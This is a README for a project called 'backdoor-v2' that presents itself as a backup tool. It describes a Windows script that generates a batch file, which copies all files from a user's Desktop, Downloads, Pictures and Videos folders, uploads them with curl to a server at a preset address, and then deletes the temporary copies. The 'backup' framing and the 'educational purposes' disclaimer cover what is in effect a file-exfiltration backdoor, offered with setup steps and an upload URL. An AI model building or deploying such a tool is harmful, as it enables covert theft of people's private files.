# backdoor-v2
# Disclaimer
This is for educational purposes only
Make changes where necessary

# Description
Overview: This project contains a script that automates the backup of files from specified user directories (Desktop, Downloads, Pictures, Videos) and uploads them to a Python server.
# Features
File Backup: Automatically copies files from predefined directories.
HTTP Upload: Uses curl to upload files to a specified server URL.
Temporary Storage: Creates a temporary directory to hold files before uploading.
Clean-Up: Deletes the temporary files and directory after the upload is completed.
# Requirements
Environment: Windows operating system (as it uses Windows Script Host).
Dependencies:
curl: Must be installed and accessible from the command line.
A running Python server capable of handling file uploads.
# Usage
Set Up the Python Server: Ensure you have a Python server running at the specified URL (default: http://192.168.1.90:8888/upload) to handle file uploads.
Run the Script: Execute the script to create a batch file that will:
Copy files from the specified directories to a temporary location.
Upload the copied files to the Python server.
Clean up any temporary files created during the process.
# Code Explanation
Batch File Creation:
The script generates a batch file that includes commands to copy files and upload them.
File Copying:
Uses xcopy to recursively copy files from the user’s Desktop, Downloads, Pictures, and Videos folders to a temporary directory.
File Uploading:
Each file in the temporary directory is uploaded using curl.
Cleanup:
The script removes the temporary directory after uploading the files.
Example
# plaintext
Copy code
Set the target URL of your Python server
set server_url=http://192.168.1.90:8888/upload
# License
License: Specify the license under which the project is released (e.g., MIT, Apache).

# Acknowledgments
Credits: Acknowledge any resources or inspirations used in developing the project.
